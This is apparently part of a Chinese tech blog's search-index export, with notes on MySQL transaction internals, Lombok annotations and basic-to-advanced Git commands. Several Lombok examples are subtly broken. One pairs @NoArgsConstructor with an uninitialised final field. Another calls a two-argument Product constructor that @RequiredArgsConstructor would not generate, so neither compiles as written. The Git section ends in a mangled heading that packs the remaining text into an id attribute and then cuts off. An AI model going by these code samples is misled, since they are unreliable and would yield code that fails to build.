<li><strong>使用查询分析工具</strong>：如MySQL的EXPLAIN、Oracle的SQL Trace和TKPROF等，可以分析查询的执行计划并找出性能瓶颈。</li>
<li><strong>使用数据库自带的性能监控工具</strong>：如MySQL Enterprise Monitor、Oracle Enterprise Manager等，可以实时监控数据库性能并找出优化点。</li>
<li><strong>第三方优化工具</strong>：如Toad for Oracle、SQL Server Management Studio (SSMS)等，提供了丰富的SQL优化功能和分析建议。</li>
</ol>
<h2 id="MySQL事务机制介绍"><a href="#MySQL事务机制介绍" class="headerlink" title="MySQL事务机制介绍"></a>MySQL事务机制介绍</h2><p>MySQL的事务机制是确保数据一致性和完整性的关键所在，它主要通过以下几种特性来实现：</p>
<h3 id="一、事务的四大特性（ACID）"><a href="#一、事务的四大特性（ACID）" class="headerlink" title="一、事务的四大特性（ACID）"></a>一、事务的四大特性（ACID）</h3><ol>
<li><strong>原子性（Atomicity）</strong><ul>
<li>事务是一个不可分割的工作单位，其中的操作要么全部执行，要么全部不执行。</li>
<li>如果事务中的某个操作失败，则已执行的操作必须回滚，数据库退回到事务前的状态。</li>
</ul>
</li>
<li><strong>一致性（Consistency）</strong><ul>
<li>事务必须使数据库从一个一致性状态变换到另一个一致性状态。</li>
<li>一致性是事务追求的最终目标，原子性、隔离性、持久性都是为了保证数据库的一致性。</li>
</ul>
</li>
<li><strong>隔离性（Isolation）</strong><ul>
<li>事务之间不会相互影响，并发执行的各个事务之间不能相互干扰。</li>
<li>隔离性由锁机制和MVCC（多版本并发控制）机制共同实现。</li>
<li>MySQL支持四种事务隔离级别：读未提交（READ UNCOMMITTED）、读已提交（READ COMMITTED）、可重复读（REPEATABLE READ，MySQL的默认隔离级别）、可串行化（SERIALIZABLE）。</li>
</ul>
</li>
<li><strong>持久性（Durability）</strong><ul>
<li>事务一旦提交，其所做的修改都会永久保存到数据库中，即使系统崩溃也不会丢失。</li>
<li>持久性通过InnoDB的redo log、undo log和Force Log at Commit机制来实现。</li>
</ul>
</li>
</ol>
<h3 id="二、InnoDB存储引擎的事务实现"><a href="#二、InnoDB存储引擎的事务实现" class="headerlink" title="二、InnoDB存储引擎的事务实现"></a>二、InnoDB存储引擎的事务实现</h3><ol>
<li><strong>redo log（重做日志）</strong><ul>
<li>记录事务提交的更改，用于在系统崩溃时恢复数据。</li>
<li>采用WAL（Write Ahead Log，预写日志）策略，即先写重做日志，再挑选时间将脏页写入磁盘。</li>
</ul>
</li>
<li><strong>undo log（回滚日志）</strong><ul>
<li>记录事务未提交的更改，用于事务回滚。</li>
<li>也用于多版本并发控制（MVCC），提供数据的快照读。</li>
</ul>
</li>
<li><strong>锁机制</strong><ul>
<li>InnoDB通过行级锁和表级锁来控制并发访问，确保数据的一致性和完整性。</li>
<li>锁机制包括共享锁（S锁）和排他锁（X锁），以及意向锁等。</li>
</ul>
</li>
<li><strong>MVCC（多版本并发控制）</strong><ul>
<li>在事务开始时生成一个一致性快照，事务在执行过程中会使用这个快照读取数据。</li>
<li>即使其他事务插入了新记录，当前事务仍会基于它启动时的快照来读取数据，从而避免脏读、不可重复读和幻读。</li>
<li>InnoDB通过undo log来实现MVCC。</li>
</ul>
</li>
</ol>
<h3 id="三、事务的使用和管理"><a href="#三、事务的使用和管理" class="headerlink" title="三、事务的使用和管理"></a>三、事务的使用和管理</h3><ol>
<li><strong>事务的开始和结束</strong><ul>
<li>在MySQL中，通常使用START TRANSACTION或BEGIN来开始一个事务。</li>
<li>使用COMMIT来提交事务，使所有更改永久生效。</li>
<li>使用ROLLBACK来回滚事务，撤销所有更改。</li>
</ul>
</li>
<li><strong>异常处理</strong><ul>
<li>在事务执行过程中，要妥善处理可能出现的异常。</li>
<li>当出现异常时，需要确保事务能够回滚到开始之前的状态，以避免数据不一致。</li>
</ul>
</li>
<li><strong>性能优化</strong><ul>
<li>虽然事务提供了数据完整性和一致性的保障，但它们也可能对性能产生影响。</li>
<li>因此，在设计数据库和编写代码时，要考虑到事务的开销，并尽可能减少不必要的事务和长时间运行的事务。</li>
</ul>
</li>
</ol>
<p>综上所述，MySQL的事务机制通过ACID特性、InnoDB存储引擎的redo log、undo log、锁机制和MVCC等机制共同实现，确保了数据的一致性和完整性。在开发过程中，开发者需要正确使用和管理事务，以充分发挥MySQL事务机制的优势。</p>
]]></content>
      <categories>
        <category>缓存与数据库</category>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Tip-Java-Lombok</title>
    <url>/2025/02/17/Tip-Java-Lombok/</url>
    <content><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Lombok 是一款 Java 开发的实用工具库，主要用于简化 Java 代码的 boilerplate（模板化代码）。它通过注解的方式，在编译时自动生成常见的代码逻辑，如 getter、setter、构造方法等。</p>
<p><strong>核心功能</strong>：</p>
<ol>
<li><strong>减少冗余代码</strong>：自动为类生成 getter、setter、toString 等方法。</li>
<li><strong>简化构造器</strong>：支持一键生成无参构造器、全参构造器或指定字段的构造器。</li>
<li><strong>日志支持</strong>：通过注解快速集成常用的日志框架。</li>
<li><strong>提升可读性</strong>：使代码更加简洁和易于维护。</li>
</ol>
<p>适合需要快速开发且希望减少手动编写样板代码的场景。</p>
<h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><h3 id="1-引入-Lombok"><a href="#1-引入-Lombok" class="headerlink" title="1. 引入 Lombok"></a>1. <strong>引入 Lombok</strong></h3><p>在使用 Lombok 之前，需要将其添加到项目中。</p>
<h4 id="Maven-项目"><a href="#Maven-项目" class="headerlink" title="Maven 项目"></a>Maven 项目</h4><p>在 <code>pom.xml</code> 文件中添加以下依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.18.28<span class="tag">&lt;/<span class="name">version</span>&gt;</span> <span class="comment">&lt;!-- 请根据最新版本调整 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="Gradle-项目"><a href="#Gradle-项目" class="headerlink" title="Gradle 项目"></a>Gradle 项目</h4><p>在 <code>build.gradle</code> 文件中添加以下内容：</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">implementation <span class="string">&#x27;org.projectlombok:lombok:1.18.28&#x27;</span> <span class="comment">// 请根据最新版本调整</span></span><br><span class="line">annotationProcessor <span class="string">&#x27;org.projectlombok:lombok:1.18.28&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="IDE-配置"><a href="#IDE-配置" class="headerlink" title="IDE 配置"></a>IDE 配置</h4><ul>
<li>如果使用 IntelliJ IDEA，请安装 Lombok 插件（File -&gt; Settings -&gt; Plugins 搜索 “Lombok” 并安装）。</li>
<li>安装后，重启 IDE 并启用注解处理（Settings -&gt; Build, Execution, Deployment -&gt; Compiler -&gt; Annotation Processors，勾选 “Enable annotation processing”）。</li>
</ul>
<h3 id="2-常用注解及其功能"><a href="#2-常用注解及其功能" class="headerlink" title="2. 常用注解及其功能"></a>2. <strong>常用注解及其功能</strong></h3><h4 id="1-Getter-和-Setter"><a href="#1-Getter-和-Setter" class="headerlink" title="(1) @Getter 和 @Setter"></a>(1) <code>@Getter</code> 和 <code>@Setter</code></h4><p>生成类字段的 getter 和 setter 方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="keyword">import</span> lombok.Setter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="meta">@Getter</span> <span class="meta">@Setter</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Getter</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age; <span class="comment">// 只生成 getter 方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-ToString"><a href="#2-ToString" class="headerlink" title="(2) @ToString"></a>(2) <code>@ToString</code></h4><p>生成 <code>toString()</code> 方法，默认包含所有字段。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> lombok.ToString;</span><br><span class="line"></span><br><span class="line"><span class="meta">@ToString</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出：User(name=张三, age=25)</span></span><br></pre></td></tr></table></figure>

<h4 id="3-EqualsAndHashCode"><a href="#3-EqualsAndHashCode" class="headerlink" title="(3) @EqualsAndHashCode"></a>(3) <code>@EqualsAndHashCode</code></h4><p>生成 <code>equals()</code> 和 <code>hashCode()</code> 方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> lombok.EqualsAndHashCode;</span><br><span class="line"></span><br><span class="line"><span class="meta">@EqualsAndHashCode</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4-Data"><a href="#4-Data" class="headerlink" title="(4) @Data"></a>(4) <code>@Data</code></h4><p>综合注解，包含 <code>@Getter</code>、<code>@Setter</code>、<code>@ToString</code>、<code>@EqualsAndHashCode</code> 和 <code>@RequiredArgsConstructor</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 自动生成 getter、setter、toString、equals 和 hashCode 方法。</span></span><br></pre></td></tr></table></figure>

<h4 id="5-NoArgsConstructor-AllArgsConstructor-RequiredArgsConstructor"><a href="#5-NoArgsConstructor-AllArgsConstructor-RequiredArgsConstructor" class="headerlink" title="(5) @NoArgsConstructor, @AllArgsConstructor, @RequiredArgsConstructor"></a>(5) <code>@NoArgsConstructor</code>, <code>@AllArgsConstructor</code>, <code>@RequiredArgsConstructor</code></h4><p>生成构造方法：</p>
<ul>
<li><code>@NoArgsConstructor</code>：无参构造方法。</li>
<li><code>@AllArgsConstructor</code>：全参构造方法。</li>
<li><code>@RequiredArgsConstructor</code>：为 <code>final</code> 字段或带有 <code>@NonNull</code> 注解的字段生成构造方法。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.RequiredArgsConstructor;</span><br><span class="line"></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@RequiredArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="6-Slf4j-或-Log"><a href="#6-Slf4j-或-Log" class="headerlink" title="(6) @Slf4j 或 @Log"></a>(6) <code>@Slf4j</code> 或 <code>@Log</code></h4><p>快速集成日志功能。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Example</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        log.info(<span class="string">&quot;This is a log message.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="3-常见的相关配置"><a href="#3-常见的相关配置" class="headerlink" title="3. 常见的相关配置"></a>3. 常见的相关配置</h3><h4 id="日志级别配置"><a href="#日志级别配置" class="headerlink" title="日志级别配置"></a><strong>日志级别配置</strong></h4><p>Lombok的日志注解（如<code>@Slf4j</code>）会生成日志记录器，因此可以通过配置日志级别来控制日志输出。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">logging:</span></span><br><span class="line">  <span class="attr">level:</span></span><br><span class="line">    <span class="attr">root:</span> <span class="string">info</span> <span class="comment"># 设置全局日志级别为info</span></span><br><span class="line">    <span class="attr">com.example:</span> <span class="string">debug</span> <span class="comment"># 设置特定包的日志级别为debug</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>root</code>: 全局日志级别。</li>
<li><code>com.example</code>: 替换为你的项目包名，用于设置特定包的日志级别。</li>
</ul>
<h4 id="自定义日志格式"><a href="#自定义日志格式" class="headerlink" title="自定义日志格式"></a><strong>自定义日志格式</strong></h4><p>虽然Lombok生成的日志器默认使用SLF4J，但可以通过Spring Boot配置日志格式：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">logging:</span></span><br><span class="line">  <span class="attr">pattern:</span></span><br><span class="line">    <span class="attr">console:</span> <span class="string">&quot;%d&#123;yyyy-MM-dd HH:mm:ss&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n&quot;</span></span><br><span class="line">    <span class="attr">file:</span> <span class="string">&quot;%d&#123;yyyy-MM-dd HH:mm:ss&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n&quot;</span></span><br></pre></td></tr></table></figure>





<h3 id="4-示例：综合使用-Lombok"><a href="#4-示例：综合使用-Lombok" class="headerlink" title="4. 示例：综合使用 Lombok"></a>4. <strong>示例：综合使用 Lombok</strong></h3><p>以下是一个综合示例，展示如何使用多个 Lombok 注解来简化代码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.NonNull;</span><br><span class="line"><span class="keyword">import</span> lombok.RequiredArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@RequiredArgsConstructor</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Product</span> &#123;</span><br><span class="line">    <span class="meta">@NonNull</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> price;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">displayInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        log.info(<span class="string">&quot;Product Name: &#123;&#125;, Price: &#123;&#125;&quot;</span>, name, price);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Product</span> <span class="variable">product</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Product</span>(<span class="string">&quot;Laptop&quot;</span>, <span class="number">1200.0</span>);</span><br><span class="line">        product.displayInfo();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>Java</category>
        <category>框架与工具</category>
      </categories>
      <tags>
        <tag>lombok</tag>
      </tags>
  </entry>
  <entry>
    <title>T-Git</title>
    <url>/2024/08/11/T-Git/</url>
    <content><![CDATA[<h2 id="常见git命令参考"><a href="#常见git命令参考" class="headerlink" title="常见git命令参考"></a>常见git命令<br><span id="more"></span><br><a href="https://zhuanlan.zhihu.com/p/402325945">参考</a></h2><h1 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h1><h2 id="git-help-帮助"><a href="#git-help-帮助" class="headerlink" title="git help 帮助"></a>git help 帮助</h2><p>Git中有许多命令，如果你需要其他命令的帮助，则可以随时在终端上使用git help。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git help &lt;git_command&gt;</span><br></pre></td></tr></table></figure>
<h2 id="git-config-身份与Email"><a href="#git-config-身份与Email" class="headerlink" title="git config 身份与Email"></a>git config 身份与Email</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git config --global user.name &quot;Your name&quot;  </span><br><span class="line">$ git config --global user.email &quot;Your email&quot;</span><br></pre></td></tr></table></figure>
<h2 id="git-version-版本"><a href="#git-version-版本" class="headerlink" title="git version 版本"></a>git version 版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git version</span><br></pre></td></tr></table></figure>
<h2 id="git-init"><a href="#git-init" class="headerlink" title="git init"></a>git init</h2><p>在当前文件夹创建空白或指定名称的存储库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git init</span><br><span class="line">$ git init &lt;your repository name&gt;</span><br></pre></td></tr></table></figure>
<h2 id="git-clone-复制"><a href="#git-clone-复制" class="headerlink" title="git clone 复制"></a>git clone 复制</h2><p>git clone命令将使用现有的存储库进行复制。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone &lt;url&gt; [directory]</span><br></pre></td></tr></table></figure>
<h2 id="git-add-添加到存储库"><a href="#git-add-添加到存储库" class="headerlink" title="git add 添加到存储库"></a>git add 添加到存储库</h2><p>git add命令会把所有新的代码文件或修改后的文件中。此命令提供了添加文件和文件夹的不同选项。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//将单个文件添加到暂存区</span><br><span class="line">$ git add your_file_name</span><br><span class="line">//此选项会将所有修改过的文件和新文件添加到暂存区</span><br><span class="line">$ git add *</span><br></pre></td></tr></table></figure>
<h2 id="git-commit-将更改添加到本地存储库"><a href="#git-commit-将更改添加到本地存储库" class="headerlink" title="git commit 将更改添加到本地存储库"></a>git commit 将更改添加到本地存储库</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git commit -m &quot;your useful commit message&quot;</span><br></pre></td></tr></table></figure>
<p>git add 是将文件添加到暂存区的操作，而 git commit 是将暂存区的内容提交到本地仓库的操作。通过此方法使得可以选择性地将部分文件或更改提交到本地仓库，或在意识到某些更改不应该被提交，可以在提交之前将其移除或修改，而不会影响到已经提交的历史记录</p>
<h2 id="git-status-查看相关文件的状态"><a href="#git-status-查看相关文件的状态" class="headerlink" title="git status 查看相关文件的状态"></a>git status 查看相关文件的状态</h2><p>此命令可以用来在git add和git commit之间查看状态。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git status</span><br></pre></td></tr></table></figure>
<h2 id="git-branch-分支操作"><a href="#git-branch-分支操作" class="headerlink" title="git branch 分支操作"></a>git branch 分支操作</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//列出所有分支：</span><br><span class="line">$ git branch</span><br><span class="line">//创建新的分支：</span><br><span class="line">$ git branch &lt;branch_name&gt;</span><br><span class="line">//删除分支：</span><br><span class="line">$ git branch -d &lt;branch_name&gt;</span><br></pre></td></tr></table></figure>
<h2 id="git-checkout-切换分支"><a href="#git-checkout-切换分支" class="headerlink" title="git checkout 切换分支"></a>git checkout 切换分支</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//切换到另一个分支</span><br><span class="line">$ git checkout &lt;branch_name&gt;</span><br><span class="line">//创建并转移到分支</span><br><span class="line">$ git checkout -b &lt;your_new_branch_name&gt;</span><br></pre></td></tr></table></figure>
<h1 id="中级Git命令"><a href="#中级Git命令" class="headerlink" title="中级Git命令"></a>中级Git命令</h1><h2 id="git-remote-添加远程仓库"><a href="#git-remote-添加远程仓库" class="headerlink" title="git remote 添加远程仓库"></a>git remote 添加远程仓库</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git remote add &lt;shortname&gt; &lt;url&gt;</span><br><span class="line">$ git remote -v  //查看当前的默认远程仓库和分支</span><br></pre></td></tr></table></figure>
<p>举例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git remote add origin https://dev.azure.com/aCompiler/_git/DemoProject</span><br></pre></td></tr></table></figure>
<h2 id="git-push-推送到远程仓库"><a href="#git-push-推送到远程仓库" class="headerlink" title="git push 推送到远程仓库"></a>git push 推送到远程仓库</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git push &lt;远程主机名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt;</span><br></pre></td></tr></table></figure>
<p>如果省略远程分支名，则表示将本地分支推送与之存在”追踪关系”的远程分支（通常两者同名），如果该远程分支不存在，则会被新建</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git push origin master</span><br></pre></td></tr></table></figure>
<p>如果当前分支与远程分支之间存在追踪关系，则本地分支和远程分支都可以省略。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//将当前分支推送到origin主机的对应分支。</span><br><span class="line">git push origin</span><br></pre></td></tr></table></figure>
<p>如果当前分支只有一个追踪分支，那么主机名都可以省略。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git push</span><br></pre></td></tr></table></figure>
<h2 id="git-push-–set-upstream"><a href="#git-push-–set-upstream" class="headerlink" title="git push –set-upstream"></a>git push –set-upstream</h2><p>设置好origin和upstream。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git push --set-upstream &lt;short_name&gt; &lt;branch_name&gt;</span><br></pre></td></tr></table></figure>
<h2 id="git-fetch-下载有关提交、引用等的所有信息"><a href="#git-fetch-下载有关提交、引用等的所有信息" class="headerlink" title="git fetch 下载有关提交、引用等的所有信息"></a>git fetch 下载有关提交、引用等的所有信息</h2><p>从远程仓库获取最新提交的命令，但它不会自动将获取到的提交合并到本地分支中。相反，它将更新远程仓库的引用，让你能够查看远程仓库的最新状态，然后决定是否需要合并这些更改到你的本地分支中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git fetch &lt;remote&gt;</span><br></pre></td></tr></table></figure>
<h2 id="git-pull-下载内容"><a href="#git-pull-下载内容" class="headerlink" title="git pull 下载内容"></a>git pull 下载内容</h2><p>从远程仓库获取最新提交，并将它们合并到当前分支中.相当于git fetch 和 git merge 这两个步骤的组合操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git pull &lt;remote_url&gt;</span><br></pre></td></tr></table></figure>
<h2 id="git-stash"><a href="#git-stash" class="headerlink" title="git stash"></a>git stash</h2><p>暂存当前工作目录中的修改，使得你可以在不提交更改的情况下切换到其他分支或者进行其他操作。当你需要在当前分支上开始新的工作，但又不想提交或者清理掉正在进行中的修改时，git stash 就可以派上用场。执行 git stash 命令会执行以下操作：</p>
<ol>
<li>将工作目录中未暂存的修改（即尚未添加到暂存区的修改）暂存起来。</li>
<li>清空工作目录中的修改，使得它变为干净的状态，就像刚刚执行完 git add 一样。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git stash</span><br><span class="line">//查看所有stash</span><br><span class="line">$ git stash list</span><br><span class="line">//再次应用之前暂存的修改</span><br><span class="line">$ git stash apply</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="git-log-查看当前分支的提交历史"><a href="#git-log-查看当前分支的提交历史" class="headerlink" title="git log 查看当前分支的提交历史"></a>git log 查看当前分支的提交历史</h2><p>显示提交历史中的每个提交（commit），包括提交作者、提交日期、提交信息等信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git log</span><br></pre></td></tr></table></figure>
<p>可选参数</p>
<blockquote>
<p>–oneline：以一行的形式显示提交历史，只显示提交哈希值和提交信息。<br>–graph：在提交历史的输出中添加 ASCII 图形表示的分支合并情况。<br>–author&#x3D;&lt;author&gt;：只显示指定作者（提交者）的提交历史。<br>–since&#x3D;&lt;date&gt;：只显示指定日期之后的提交历史。<br>–until&#x3D;&lt;date&gt;：只显示指定日期之前的提交历史</p>
</blockquote>
<h2 id="git-shortlog"><a href="#git-shortlog" class="headerlink" title="git shortlog"></a>git shortlog</h2><h2 id="git-shortlog命令会显示来自git-log命令的摘要。如果你只对简短的摘要感兴趣，那么此命令就非常有用了。这个命令有助于查看谁处理了什么，因为它对作者及其提交进行了分组。-git-show与git-log相比，此命令将显示有关特定提交的详细信息。-git-rm-删除文件从当前工作目录和暂存区中删除文件。与普通的文件删除不同，git-rm-命令会将删除操作记录到-Git-的历史记录中，这样可以确保删除操作被跟踪并记录下来。-git-merge-合并分支git-merge可帮助将来自两个分支的更改集成到单个分支中。此命令会将合并到当前分支中。-高级Git命令-git-rebasegit-rebase类似于git-merge命令。它把两个分支集成到一个分支中，但有一个不一样的地方：git-rebase命令将会重写提交记录。当你有多个私有分支合并到单个分支时，应使用git-rebase命令。它将使得提交历史成为线性的。-git-bisectgit-bisect命令可帮助查找糟糕的提交。通过git-bisect，只要几分钟你就可以缩小问题代码的范围。-git-cherry-pickgit-cherry-pick是一个蛮有用的命令，允许你从任意分支中选择任意提交并将其应用于其他任意分支。git-cherry-pick不会修改存储库的历史记录；相反，它会添加到历史记录。-git-archivegit-archive命令会把多个文件合并为单个文件。就好像zip实用程序一样，所以你可以提取存档文件以获取单个文件。它将创建当前修订的zip存档。-git-pull-–rebase在大多数情况下，当你使用git-pull时，你需要重新设置基准（并且不进行合并）。此时，你就可以使用此选项。这将帮助保持干净的历史记录。另外，还可以避免多次合并。-git-blame如果你需要逐行检查任意文件的内容，则需要使用git-blame命令。它可以帮助确定是谁对文件进行了更改。-git-tag在Git中，标签很有用，你可以使用它们来管理发布。你可以将git-tag视为不会改变的分支。尤其是要公开发布的时候，则更为重要了。-git-verify-commitgit-verify-commit命令将检查gpg签名。GPG，GNU-Privacy-Guard，是sign文件中使用的工具，包含签名。-git-verify-tag可以以同样的方式确认标签。-git-diff大多数情况下，在提交或推送之前，你需要比较两个git文件或分支。用这个命令就方便多了。-git-citoolgit-citool是Git提交的图形化替代。-git-mv重命名git文件。接受两个参数，源文件名和目标文件名。-git-clean你可以使用git-clean命令处理未跟踪的文件。可以使用此命令从工作目录中删除所有未跟踪的文件。如果要处理跟踪的文件，则需要使用git-reset命令。"><a href="#git-shortlog命令会显示来自git-log命令的摘要。如果你只对简短的摘要感兴趣，那么此命令就非常有用了。这个命令有助于查看谁处理了什么，因为它对作者及其提交进行了分组。-git-show与git-log相比，此命令将显示有关特定提交的详细信息。-git-rm-删除文件从当前工作目录和暂存区中删除文件。与普通的文件删除不同，git-rm-命令会将删除操作记录到-Git-的历史记录中，这样可以确保删除操作被跟踪并记录下来。-git-merge-合并分支git-merge可帮助将来自两个分支的更改集成到单个分支中。此命令会将合并到当前分支中。-高级Git命令-git-rebasegit-rebase类似于git-merge命令。它把两个分支集成到一个分支中，但有一个不一样的地方：git-rebase命令将会重写提交记录。当你有多个私有分支合并到单个分支时，应使用git-rebase命令。它将使得提交历史成为线性的。-git-bisectgit-bisect命令可帮助查找糟糕的提交。通过git-bisect，只要几分钟你就可以缩小问题代码的范围。-git-cherry-pickgit-cherry-pick是一个蛮有用的命令，允许你从任意分支中选择任意提交并将其应用于其他任意分支。git-cherry-pick不会修改存储库的历史记录；相反，它会添加到历史记录。-git-archivegit-archive命令会把多个文件合并为单个文件。就好像zip实用程序一样，所以你可以提取存档文件以获取单个文件。它将创建当前修订的zip存档。-git-pull-–rebase在大多数情况下，当你使用git-pull时，你需要重新设置基准（并且不进行合并）。此时，你就可以使用此选项。这将帮助保持干净的历史记录。另外，还可以避免多次合并。-git-blame如果你需要逐行检查任意文件的内容，则需要使用git-blame命令。它可以帮助确定是谁对文件进行了更改。-git-tag在Git中，标签很有用，你可以使用它们来管理发布。你可以将git-tag视为不会改变的分支。尤其是要公开发布的时候，则更为重要了。-git-verify-commitgit-verify-commit命令将检查gpg签名。GPG，GNU-Privacy-Guard，是sign文件中使用的工具，包含签名。-git-verify-tag可以以同样的方式确认标签。-git-diff大多数情况下，在提交或推送之前，你需要比较两个git文件或分支。用这个命令就方便多了。-git-citoolgit-citool是Git提交的图形化替代。-git-mv重命名git文件。接受两个参数，源文件名和目标文件名。-git-clean你可以使用git-clean命令处理未跟踪的文件。可以使用此命令从工作目录中删除所有未跟踪的文件。如果要处理跟踪的文件，则需要使用